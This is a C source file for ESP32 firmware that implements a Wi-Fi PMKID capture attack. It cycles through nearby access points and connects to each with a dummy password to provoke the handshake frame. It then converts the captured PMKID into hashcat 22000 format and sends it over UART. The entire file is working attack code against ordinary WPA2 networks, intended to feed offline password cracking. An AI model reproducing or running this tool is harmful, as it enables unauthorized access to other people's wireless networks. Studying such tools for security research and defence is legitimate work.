#include "attack_pmkid.h"
#include <string.h>
#include <stdio.h>
#include "esp_event.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"
#include "tasks_mannager.h"
#include "uart_controller.h"
#include "data_converter.h"

static TaskHandle_t pmkid_handle = NULL;
static bool attack_state = 0;
static wifi_ap_record_t ap_info[DEFAULT_SCAN_LIST_SIZE] = {};
static uint16_t ap_count = 0;
static int last_scanned_target = 0;

static void pmkid_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    vTaskSuspend(pmkid_handle);

    attack_pmkid_stop();
    key_data_t *key_data = (key_data_t *)event_data;
    uint8_t *pmkid = key_data->pmkid;
    uint8_t mac_client[6] = {};
    wifi_get_sta_mac(mac_client);
    uint16_t pmkid_data_len = strlen("PMKID data: ");
    //pmkid_data_len + MAX_HC22000_01_LEN + '\n' + '\0'
    char pmkid_buff[pmkid_data_len + MAX_HC22000_01_LEN + 2];
    memcpy(pmkid_buff, "PMKID data: ", pmkid_data_len);
    pmkid_data_len += pmkid_to_hc22000(
        pmkid_buff + pmkid_data_len,
        pmkid, 
        (uint8_t *)(ap_info + last_scanned_target)->bssid, 
        mac_client, 
        (uint8_t *)(ap_info + last_scanned_target)->ssid,
        strlen((char *)(ap_info + last_scanned_target)->ssid)
    );
    memcpy(pmkid_buff + pmkid_data_len, "\n", 2);
    pmkid_data_len++;
    UART_write(pmkid_buff, pmkid_data_len);

    vTaskResume(pmkid_handle);
}

void pmkid_active_scan_task(void *arg) {
    int scanned_target = 0;

    while(1) {
        vTaskDelay(50 / portTICK_PERIOD_MS);
        if (scanned_target == ap_count) {
            scanned_target = 0;
            attack_pmkid_stop();
            wifi_scan(ap_info, &ap_count);
        }
        last_scanned_target = scanned_target;
        if (attack_state) {
            frame_analyzer_change_bssid_filter((ap_info + scanned_target)->bssid);
            wifi_sniffer_start((ap_info + scanned_target)->primary);
        } else {
            attack_pmkid_start(ap_info + scanned_target);
        }
        wifi_sta_connect_to_ap(ap_info + scanned_target, "dummypassword");

        uint16_t ssid_data_len = strlen((char *)(ap_info + last_scanned_target)->ssid) + strlen("Current SSID: ") + 1;
        char ssid_data[ssid_data_len + 1];
        sprintf(ssid_data, "Current SSID: %s\n", (ap_info + last_scanned_target)->ssid);
        UART_write(ssid_data, ssid_data_len);

        vTaskDelay(AP_SCAN_TIME_MS / portTICK_PERIOD_MS);
        wifi_sta_disconnect();
        scanned_target++;
    }

    vTaskDelete(NULL);
}

void attack_pmkid_start(wifi_ap_record_t * ap_record) {
    wifi_sniffer_filter_frame_types(true, false, false);
    wifi_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_handler, NULL));
    attack_state = 1;
}

void attack_pmkid_stop() {
    if (attack_state == 0) return;
    attack_state = 0;
    wifi_sta_disconnect();
    wifi_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_handler));
}

void pmkid_scan_start() {
    xTaskCreate(pmkid_active_scan_task, "at_handler_task", 1024*2, NULL, configMAX_PRIORITIES - 1, &pmkid_handle);
}

void pmkid_scan_stop() {
    if (pmkid_handle != NULL) {
        vTaskDelete(pmkid_handle);
    }
    attack_pmkid_stop();
}